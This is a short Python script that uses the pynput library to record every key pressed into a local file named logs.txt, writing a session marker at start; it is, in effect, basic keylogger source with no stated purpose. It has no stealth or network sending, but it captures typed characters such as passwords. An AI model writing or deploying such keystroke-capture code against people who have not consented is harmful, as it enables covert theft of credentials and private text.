from pynput import keyboard
start = 0

if start == 0:
    with open("logs.txt", 'a') as file:
        file.write("\n===[ NEW SESSION ]===\n")

def keyPressed(key):
    print(str(key))
    with open("logs.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error with getting input")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()